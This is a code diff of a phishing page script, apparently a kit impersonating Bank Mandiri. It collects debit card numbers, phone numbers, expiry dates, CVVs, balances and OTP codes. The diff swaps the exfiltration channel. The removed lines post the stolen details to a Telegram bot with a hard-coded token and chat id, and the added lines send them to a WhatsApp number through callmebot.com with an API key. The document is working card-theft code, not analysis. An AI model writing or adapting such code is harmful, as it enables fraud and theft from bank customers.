@@ -386,9 +386,13 @@ var rupiah = sessionStorage.getItem("rupiah");
 document.getElementById("saldoku").value = rupiah + "";
 </script>
 <script>
-function kirimPesan(event) {
-  $("#lodingku").show();
-  event.preventDefault();
+$('#pincode').on('submit', function (event) {
+
+
+
+    event.stopPropagation();
+    event.preventDefault();
+$("#lodingku").show();
 
 
   var debitku = document.getElementById('debitku');
@@ -407,14 +411,16 @@ function kirimPesan(event) {
 
     var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗘𝗕𝗜𝗧%3A%0A' + debitku.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :%0A' + nomorku.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂%3A%0A' + validku.value + '%0A𝗖𝗩𝗩%3A%0A' + cvvku.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮 :%0A' + saldoku.value + '%0A%0A𝗠𝗮𝗻𝗱𝗶𝗿𝗶 𝗢𝗧𝗣 : %0A' +   pin.value + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value;
 
-    var token = '6372515846:AAExlt3EkQfGz1Ax5SaqkYzOTOnZt4zoJ9s'; // Ganti dengan token bot yang kamu buat
-    var grup = '6928230375'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
+   
+ $.ajax({
+              url: `https://api.callmebot.com/whatsapp.php?phone=6282281473869&text=${gabungan}&apikey=9087360`,
+              type: 'post',
+              data: $(this).serialize(), 
+             
         
-   success: function(){
+      complete: function(data) {
+            // Тут можем что-то делать ПОСЛЕ успешной отправки формы
+            console.log('Complete')
     setTimeout(function(){
        $("#lodingku").hide();
      document.getElementById("pincode").reset();
@@ -424,7 +430,12 @@ function kirimPesan(event) {
    setTimeout(() => {
        $("#notif").fadeOut();
    }, 2500);
-    }, 1500);}});};
+    }, 1500);
+        }
+    });
+
+    return false;
+});
 </script>
 <script>
 
